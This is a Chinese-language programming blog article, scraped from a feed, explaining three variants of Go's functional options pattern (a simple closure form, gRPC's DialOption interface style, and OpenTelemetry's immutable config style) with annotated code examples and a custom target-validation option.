                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>在 Go 里，构造函数经常会遇到一个问题：参数越来越多。例如  <code>NewServer(port, healthz, middlewares, jwt, serviceName, ...) </code> 这种函数签名，一旦需求增长就会变成“参数灾难”：</p>
<ul>
<li>
<p>可读性差：调用处一串参数，看不出谁是谁</p>
</li>
<li>
<p>易用性差：可选项很多时，必须传一堆默认值占位</p>
</li>
<li>
<p>兼容性差：新增一个参数就破坏所有调用方（编译报错）</p>
</li>
<li>
<p>维护成本高：参数顺序、默认值、校验逻辑分散</p>
</li>
</ul>
<p><code>NewServer</code>参数泛滥问题，正是 Go 语言中构造函数的常见痛点，而<strong>函数式选项模式（Functional Options Pattern）</strong> 是应对这类场景的优雅最优解。它不直接传递零散参数，而是将每个配置项封装为独立的 “选项函数”，构造函数仅接收可变长度的选项函数切片，内部遍历执行以完成结构体初始化。这种模式完美攻克参数灾难的四大痛点。</p>
<p>为了在不同复杂度与工程约束下都能落地，函数式选项模式在实践中常见三种变体：（1）轻量函数型：样板代码最少、上手最快；（2）接口 + 配置载体型（<code>gRPC</code> 风格）：进一步解耦，避免核心结构体被配置“污染”；（3）不可变配置型（<code>OpenTelemetry</code> 风格）：通过值传递返回新配置，更利于并发安全与配置可追溯。下面按顺序逐一展开。</p>
<h2 data-id="heading-1">第一种：轻量版 Functional Options（最常见）</h2>
<p>这是<strong>函数式选项模式</strong>最基础、简洁的实现形式，核心无需引入复杂接口，仅通过<strong>定义一个接收目标结构体指针的函数类型</strong>，再封装一系列<code>WithXXX</code>命名的工厂函数，返回能修改结构体字段的闭包即可。构造函数中先初始化结构体的合理默认值，再遍历执行传入的所有选项函数，覆盖用户需要自定义的配置。这种模式以极简的代码量解决了多参数构造函数的四大痛点。</p>
<p>下面例子是简单的对 <code>gin</code>  进行封装的 <code>Server</code> 端，简化了大部分逻辑，用来认识这种实现形式，在用时可根据自己的业务逻辑自行添加。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 定义选项函数类型 接收*Server指针，用于修改结构体字段</span>
<span class="hljs-keyword">type</span> ServerOption <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Server)</span></span>

<span class="hljs-comment">// WithServiceName 设置服务名称</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithServiceName</span><span class="hljs-params">(srvName <span class="hljs-type">string</span>)</span></span> ServerOption {
	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(s *Server)</span></span> {
		s.serviceName = srvName
	}
}
<span class="hljs-comment">// WithPort 设置服务端口</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithPort</span><span class="hljs-params">(port <span class="hljs-type">int</span>)</span></span> ServerOption {
	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(s *Server)</span></span> {
		s.port = port
	}
}
<span class="hljs-comment">// WithMiddlewares 设置中间件列表</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithMiddlewares</span><span class="hljs-params">(middlewares []<span class="hljs-type">string</span>)</span></span> ServerOption {
	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(s *Server)</span></span> {
		s.middlewares = middlewares
	}
}
<span class="hljs-comment">// WithHealthz 设置健康检查开关</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithHealthz</span><span class="hljs-params">(healthz <span class="hljs-type">bool</span>)</span></span> ServerOption {
	<span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(s *Server)</span></span> {
		s.healthz = healthz
	}
}

</code></pre>
<p>这种形式一般都是一个文件夹下两个文件，一个为 <code>option.go</code>， 一个为 <code>Server.go</code>，在程序的主入口，直接调用 。<code>NewServer(With...)</code>函数，拿到返回值 <code>srv</code> 之后，即可通过 <code>srv.Start()</code> 启动服务，当然可以根据自己加更多逻辑，比如优雅退出等等。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> Server <span class="hljs-keyword">struct</span> {
	*gin.Engine
	port <span class="hljs-type">int</span>
	<span class="hljs-comment">// 是否开启健康检查接口， 默认开启， 如果开启会自动添加 /health 接口</span>
	healthz <span class="hljs-type">bool</span>
	<span class="hljs-comment">// 中间件</span>
	middlewares []<span class="hljs-type">string</span>
    <span class="hljs-comment">// jwt配置信息 后续自己可扩展</span>
	jwt *JwtInfo
	server *http.Server
	serviceName <span class="hljs-type">string</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewServer</span><span class="hljs-params">(opts ...ServerOption)</span></span> *Server {
	srv := &amp;Server{
		port:            <span class="hljs-number">8080</span>,
		healthz:         <span class="hljs-literal">true</span>,
		serviceName: <span class="hljs-string">"test"</span>,
        Engine:      gin.Default(),
	}

	<span class="hljs-keyword">for</span> _, o := <span class="hljs-keyword">range</span> opts {
		o(srv)
	}
	
	<span class="hljs-comment">// 遍历用户传的中间件 在自己库中查找 没找到就跳过 这是只是为了演示配置</span>
	<span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> srv.middlewares {
		mw, ok := Middlewares[m]
		<span class="hljs-keyword">if</span> !ok {
			log.Warnf(<span class="hljs-string">"can not find middleware: %s"</span>, m)
			<span class="hljs-keyword">continue</span>
		}

		log.Infof(<span class="hljs-string">"intall middleware: %s"</span>, m)
		srv.Engine.Use(mw)
	}
    
    <span class="hljs-keyword">return</span> srv
}

<span class="hljs-comment">// 绑定一些方法 </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Server)</span></span> Start(ctx context.Context) <span class="hljs-type">error</span> {}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Server)</span></span> Stop(ctx context.Context) <span class="hljs-type">error</span> {}



<span class="hljs-comment">// 这里的代码是放到其他目录的 由于这里会用到 自己去写的时候 建议不要放到这里</span>
<span class="hljs-keyword">var</span> Middlewares = defaultMiddlewares()

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">defaultMiddlewares</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]gin.HandlerFunc {
	<span class="hljs-keyword">return</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]gin.HandlerFunc{
		<span class="hljs-string">"cors"</span>:     Cors(),  <span class="hljs-comment">// 跨域的中间件 需自行实现跨域逻辑</span>
		<span class="hljs-string">"context"</span>:  Context(), <span class="hljs-comment">// 自定义上下文传递中间件，需自行实现</span>
	}
}

</code></pre>
<h2 data-id="heading-2">第二种：接口型选项模式（<code>gRPC</code> 经典实现）</h2>
<p>这种模式是基础函数式选项的进阶，核心是引入了<strong>选项接口</strong>（<code>DialOption</code>）和<strong>专门的配置载体结构体</strong>（<code>dialOptions</code>），不再让选项函数直接耦合目标结构体（<code>ClientConn</code>）。通过定义<code>apply</code>方法作为接口约定，将所有配置项聚合到<code>dialOptions</code>中，选项的实现都围绕这个配置载体展开，最后在构造函数中统一将配置应用到目标结构体。这种模式让配置逻辑与目标结构体解耦，同时接口的约束让选项扩展更具规范性。</p>
<p>代码中有注释，等了解完代码，再回过头看下面文字会有更深的理解。</p>
<p>首先第一点<strong>解耦</strong>，解耦无论在哪种语言中提到，大部分就是多加一层，这里也是同理。比如在第一种基础的选项模式中，随着功能越来越完善，要新加一些超时字段，比如连接超时读写超时，或者就是单纯加字段，这个时候，只能在 <code>Server</code>结构体中添加这些字段，然后还要手动去写它们的默认值，再加一些 <code>with...()</code> 方法，我们要清楚的是这个结构体核心职责是 “管理网络连接”，但最终却塞满了超时还有一堆额外加的配置项，可读性和维护性极差，这就是常说的业务结构体被配置 “污染”，下面这一种就是解决这个问题，<code>DialOption</code>接口 + <code>dialOptions</code> 配置载体（<code>dialOptions</code> 里面承担了所有配置相关的逻辑 ），使得 <code>ClientConn </code>只专注于自己的核心业务，需求迭代时完全不用改动<code>ClientConn</code>。</p>
<p>第二点<strong>扩展性</strong>，这也源于 Go 面向接口编程思想，在Go语言中，<strong>接口约定优于实现</strong>：<code>DialOption</code>接口只定义了<code>apply(*dialOptions)</code>一个方法，这是一种<strong>行为约定</strong>，它不关心实现者是<code>funcDialOption</code>还是其他实现比如自己实现一个<code>ValidateTargetOption</code>，只要满足这个行为约定，就能被构造函数处理。</p>
<p>比如现在需要验证合法性，如果说是第一种，必然是在需要验证的 <code>with...()</code> 函数中添加，无疑是需要修改核心逻辑，这里只是举一个很好理解的例子，在大多数情况下，比如链路跟踪，有了一个公认的规范 <code>OpenTelemetry</code>  可以理解成类似 <code>Type-C</code> 硬件协议规范，这时候你的系统要接入链路跟踪，之前可能用的不是这种规范，如果用第一种，无疑是需要修改核心业务逻辑，如果是这一种，逻辑都再配置层，核心逻辑不需要动，这里给大家用 <code>ValidateTargetOption</code>  自己写的实现接口的结构体，用于验证<code>url</code> 是否合法，放在文章最后。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> DialOption <span class="hljs-keyword">interface</span> {
	apply(*dialOptions)
}

<span class="hljs-comment">// 实现上面接口 </span>
<span class="hljs-keyword">type</span> funcDialOption <span class="hljs-keyword">struct</span> {
    <span class="hljs-comment">// 结构体字段是函数</span>
	f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*dialOptions)</span></span>
}
<span class="hljs-comment">// 这个方法 在后续 NewClient 会用到</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fdo *funcDialOption)</span></span> apply(do *dialOptions) {
    <span class="hljs-comment">// fdo.f 本质上就是一个函数 func(*dialOptions) 里面有一些逻辑 逻辑是通过 with...() 传来的 可以看完下面的在回来理解</span>
    <span class="hljs-comment">// 把传来的 dialOptions 配置项（全局唯一） 放入f这个函数中执行对应逻辑 这些逻辑就是向它的各个字段赋值</span>
	fdo.f(do)
}

<span class="hljs-comment">// 主 ClientConn 里面有个 dialOptions 这个字段就解耦了</span>
<span class="hljs-keyword">type</span> dialOptions <span class="hljs-keyword">struct</span> {
	unaryInt  UnaryClientInterceptor
	streamInt StreamClientInterceptor
	chainUnaryInts  []UnaryClientInterceptor
	chainStreamInts []StreamClientInterceptor
    target 						<span class="hljs-type">string</span>
	compressorV0                Compressor
	dc                          Decompressor
	bs                          internalbackoff.Strategy
	block                       <span class="hljs-type">bool</span>
	returnLastError             <span class="hljs-type">bool</span>
	timeout                     time.Duration
 	disableHealthCheck          <span class="hljs-type">bool</span>
   <span class="hljs-comment">// ..... 等等一系列配置相关的  巧妙的与 主 ClientConn 分开 这使得 ClientConn 只专注于自己的核心业务</span>
}


<span class="hljs-comment">// 这个函数是用于封装的 这使得 以后的 with 方法直接调用这个函数就可以很方便的返回 实现接口的 funcDialOption 结构体</span>
<span class="hljs-comment">/* 
拆解一下这个函数便于理解： 
首先 newFuncDialOption 接收的参数就是一个 f 函数 函数长相是 func(*dialOptions) 没有返回值，形参介绍完成
其次：newFuncDialOption 的返回值 就是 实现接口的 funcDialOption 结构体  返回值介绍完成
函数内容：实现接口的 funcDialOption 结构体 有个字段是函数 把传来的形参直接赋值上并返回
*/</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">newFuncDialOption</span><span class="hljs-params">(f <span class="hljs-keyword">func</span>(*dialOptions)</span></span>) *funcDialOption {
	<span class="hljs-keyword">return</span> &amp;funcDialOption{
		f: f,
	}
}

<span class="hljs-comment">// 大家看完这种 with 函数返回的 内部逻辑  就能明白 就是给 dialOptions 里面的值赋值的</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithChainUnaryInterceptor</span><span class="hljs-params">(interceptors ...UnaryClientInterceptor)</span></span> DialOption {
	<span class="hljs-keyword">return</span> newFuncDialOption(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(o *dialOptions)</span></span> {
		o.chainUnaryInts = <span class="hljs-built_in">append</span>(o.chainUnaryInts, interceptors...)
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithStreamInterceptor</span><span class="hljs-params">(f StreamClientInterceptor)</span></span> DialOption {
	<span class="hljs-keyword">return</span> newFuncDialOption(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(o *dialOptions)</span></span> {
		o.streamInt = f
	})
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithDisableHealthCheck</span><span class="hljs-params">()</span></span> DialOption {
	<span class="hljs-keyword">return</span> newFuncDialOption(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(o *dialOptions)</span></span> {
		o.disableHealthCheck = <span class="hljs-literal">true</span>
	})
}
<span class="hljs-comment">// 等等.... 几乎能用的字段都放一个 with </span>
</code></pre>
<p>这里的最大重点就是 <code>defaultDialOptions()</code> 这个函数就是存放默认值，解耦的关键，无论后续添加什么字段，都放在该函数中进行初始化，在 <code>NewClient() </code>函数中任何地方都不需要改。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewClient</span><span class="hljs-params">(target <span class="hljs-type">string</span>, opts ...DialOption)</span></span> (conn *ClientConn, err <span class="hljs-type">error</span>) {
    cc := &amp;ClientConn{
       target: target,
       conns:  <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*addrConn]<span class="hljs-keyword">struct</span>{}),
       dopts:  defaultDialOptions(),   <span class="hljs-comment">// 一切相关的配置都放在这里 不污染主路线</span>
    }

	<span class="hljs-comment">// 这边就是我们传入的 with.... 去进行 赋值</span>
    <span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
       <span class="hljs-comment">// 调用上面的 apply 方法 </span>
       opt.apply(&amp;cc.dopts)
    }

    chainUnaryClientInterceptors(cc)
    chainStreamClientInterceptors(cc)


   <span class="hljs-comment">// 各种逻辑....</span>

    <span class="hljs-keyword">return</span> cc, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// 同样绑定各种方法 </span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cc *ClientConn)</span></span> GetState() connectivity.State {
	<span class="hljs-keyword">return</span> cc.csMgr.getState()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cc *ClientConn)</span></span> waitForResolvedAddrs(ctx context.Context) (<span class="hljs-type">bool</span>, <span class="hljs-type">error</span>) {...}
</code></pre>
<h2 data-id="heading-3">第三种：不可变配置型选项模式（<code>OpenTelemetry</code> 风格）</h2>
<p>这种模式是<strong>函数式选项的安全进阶版</strong>，核心区别于前两种的<strong>可变配置修改</strong>，它采用<strong>值传递 + 返回新配置</strong>的方式实现不可变性，所有配置操作都不会修改原有配置对象，而是返回一个全新的配置副本。这种模式在 <code>OpenTelemetry</code>、<code>Prometheus</code> 等核心组件中广泛使用，特别适合对<strong>并发安全、配置不可篡改、数据一致性</strong>有严格要求的场景（比如链路追踪、监控采集、全局配置管理等）。</p>
<p>前两种模式中，配置的修改都是就地修改（通过指针操作修改结构体字段）：第一种直接修改目标结构体 <code>*Server</code>，第二种修改配置载体 <code>*dialOptions</code>，这种可变模式在单协程场景下没问题，但在并发场景中，如果配置被意外复用、修改，可能会引发不可预期的问题。而不可变配置模式从根源上解决了这个问题 ，配置一旦创建，就无法被修改，后续的所有配置调整都只会生成新的配置对象，天然具备线程安全，且能追溯配置变更轨迹。</p>
<p>这里的 <code>tracerProviderConfig</code> 同样是用于解耦的配置项，只不过是安全进阶版。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 同样定义选项接口   不可变核心：接收旧配置，返回新配置 </span>
<span class="hljs-keyword">type</span> TracerProviderOption <span class="hljs-keyword">interface</span> {
    <span class="hljs-comment">// 与前两种的区别：apply方法不是修改指针，而是入参旧配置，返回新配置</span>
	apply(tracerProviderConfig) tracerProviderConfig
}

<span class="hljs-comment">// 定义接口的函数类型实现，类似第二种的 funcDialOption，只是简化选项创建，本质是一样的</span>
<span class="hljs-comment">// 第二种是 结构体里字段是函数  这里是 这个结构体就是个函数 函数形式 func(tracerProviderConfig) tracerProviderConfig</span>
<span class="hljs-keyword">type</span> traceProviderOptionFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(tracerProviderConfig)</span></span> tracerProviderConfig

<span class="hljs-comment">// 依旧实现 apply 方法</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fn traceProviderOptionFunc)</span></span> apply(cfg tracerProviderConfig) tracerProviderConfig {
	<span class="hljs-keyword">return</span> fn(cfg)
}


<span class="hljs-comment">// 各种 with 函数 返回都是接口   主要看 return 地方</span>
<span class="hljs-comment">/*
首先 内层 匿名函数 func(cfg tracerProviderConfig) tracerProviderConfig 这是实际承载配置逻辑的函数
traceProviderOptionFunc() 可以理解成同签名函数类型的安全转换  转换的双方是 “同构” 的，没有数据丢失 
*/</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithResource</span><span class="hljs-params">(r *resource.Resource)</span></span> TracerProviderOption {
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
		<span class="hljs-keyword">var</span> err <span class="hljs-type">error</span>
		cfg.resource, err = resource.Merge(resource.Environment(), r)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-comment">// 错误逻辑....</span>
		}
		<span class="hljs-keyword">return</span> cfg
	})
}


<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithIDGenerator</span><span class="hljs-params">(g IDGenerator)</span></span> TracerProviderOption {
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
		<span class="hljs-keyword">if</span> g != <span class="hljs-literal">nil</span> {
			cfg.idGenerator = g
		}
		<span class="hljs-keyword">return</span> cfg
	})
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithSampler</span><span class="hljs-params">(s Sampler)</span></span> TracerProviderOption {
	<span class="hljs-keyword">return</span> traceProviderOptionFunc(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(cfg tracerProviderConfig)</span></span> tracerProviderConfig {
		<span class="hljs-keyword">if</span> s != <span class="hljs-literal">nil</span> {
			cfg.sampler = s
		}
		<span class="hljs-keyword">return</span> cfg
	})
}

<span class="hljs-comment">// ....</span>
</code></pre>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewTracerProvider</span><span class="hljs-params">(opts ...TracerProviderOption)</span></span> *TracerProvider {
    <span class="hljs-comment">// 默认值</span>
    o := tracerProviderConfig{
       spanLimits: NewSpanLimits(),
    }
    <span class="hljs-comment">// 从环境变量里读取</span>
    o = applyTracerProviderEnvConfigs(o)
    
	<span class="hljs-comment">// 用户 with... 传来的 </span>
    <span class="hljs-keyword">for</span> _, opt := <span class="hljs-keyword">range</span> opts {
       o = opt.apply(o)
    }
	
	<span class="hljs-comment">// 生成 要返回值</span>
    tp := &amp;TracerProvider{
       namedTracer: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[instrumentation.Scope]*tracer),
       sampler:     o.sampler,
       idGenerator: o.idGenerator,
       spanLimits:  o.spanLimits,
       resource:    o.resource,
    }

    <span class="hljs-comment">// 其他逻辑  ...</span>

    <span class="hljs-keyword">return</span> tp
}
<span class="hljs-comment">// 同样绑定一系列方法</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *TracerProvider)</span></span> Tracer(name <span class="hljs-type">string</span>, opts ...trace.TracerOption) trace.Tracer {...}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *TracerProvider)</span></span> RegisterSpanProcessor(sp SpanProcessor) {...}

</code></pre>
<h2 data-id="heading-4">自己实现的 <code>ValidateTargetOption</code></h2>
<p>通过下面自己编写的实现 <code>DialOption</code> 接口的结构体，就能封装复杂的 <code>gRPC</code> 客户端目标地址（target）合法性校验逻辑，还能携带额外配置参数满足多样化校验需求。后续调用方只需通过我们提供的 <code>WithValidateTarget()</code> 方法传入校验规则，即可让 <code>gRPC</code> 客户端在初始化时自动完成地址校验，整个扩展过程对原有代码零侵入，扩展性和可维护性拉满。</p>
<p><code>gRPC</code> 实际 Target 格式校验更复杂，这里只是通过这个例子告诉大家可以自己写实现接口的结构体，并应用到它们内部。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// 自定义结构体：专门用于校验target合法性</span>
<span class="hljs-keyword">type</span> ValidateTargetOption <span class="hljs-keyword">struct</span> {
	<span class="hljs-comment">// 可携带额外配置，比如是否允许本地地址、是否必须是https等</span>
	allowLocal <span class="hljs-type">bool</span>
}

<span class="hljs-comment">// 实现 apply 方法</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *ValidateTargetOption)</span></span> apply(do *dialOptions) {
	<span class="hljs-comment">// 判断target是否为空</span>
	<span class="hljs-keyword">if</span> do.target == <span class="hljs-string">""</span> {
        <span class="hljs-comment">// 这里不建议直接 Fatal 这里为了演示 代码尽量少</span>
		log.Fatalf(<span class="hljs-string">"validate failed: target address is empty"</span>)
	}

	<span class="hljs-comment">// 解析url，校验格式合法性</span>
	_, err := url.Parse(do.target)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		log.Fatalf(<span class="hljs-string">"validate failed: target address format is invalid, err: %v"</span>, err)
	}

	<span class="hljs-comment">//根据allowLocal配置，判断是否允许本地地址（127.0.0.1、localhost）</span>
	<span class="hljs-keyword">if</span> !v.allowLocal &amp;&amp; (do.target == <span class="hljs-string">"127.0.0.1"</span> || do.target == <span class="hljs-string">"localhost"</span>) {
		log.Fatalf(<span class="hljs-string">"validate failed: local address is not allowed"</span>)
	}

	<span class="hljs-comment">// 校验通过，打印日志</span>
	log.Printf(<span class="hljs-string">"validate success: target address %s is valid"</span>, do.target)
}

<span class="hljs-comment">// 提供 with 函数</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithValidateTarget</span><span class="hljs-params">(allowLocal <span class="hljs-type">bool</span>)</span></span> DialOption {
	<span class="hljs-keyword">return</span> &amp;ValidateTargetOption{allowLocal: allowLocal}
}
</code></pre>
<h2 data-id="heading-5">总结</h2>
<p>函数式选项模式是 Go 语言解决构造函数 "参数灾难" 的最优解，三种实现形式各有侧重、按需选用：轻量版极简直观，无需额外接口，通过闭包直接修改目标结构体，适合普通业务服务的快速落地；接口型（<code>gRPC</code> 风格）通过引入配置载体结构体和解耦接口，让核心业务结构体摆脱配置污染，扩展性和规范性更强，适合复杂基础组件的开发；不可变配置型（<code>OpenTelemetry</code> 风格）采用值传递返回新配置的方式，从根源上保证并发安全和配置不可篡改，适合链路追踪、监控采集等对数据一致性有严格要求的场景。三种模式均能解决多参数带来的可读性、易用性等问题，核心差异在于解耦程度和安全等级，实际开发中可根据业务复杂度和场景要求选择对应的实现方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[拒绝当“重复提示词机器“：Skills 完全入门指南，及与 MCP 的深度对比]]></title>    <link>https://juejin.cn/post/7602440800295731246</link>    <guid>https://juejin.cn/post/7602440800295731246</guid>    <pubDate>2026-02-03T10:03:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602440800295731246" data-draft-id="7602464510607310874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="拒绝当“重复提示词机器“：Skills 完全入门指南，及与 MCP 的深度对比"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-02-03T10:03:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="让我上个超影吧"/> <meta itemprop="url" content="https://juejin.cn/user/3411151088782442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" 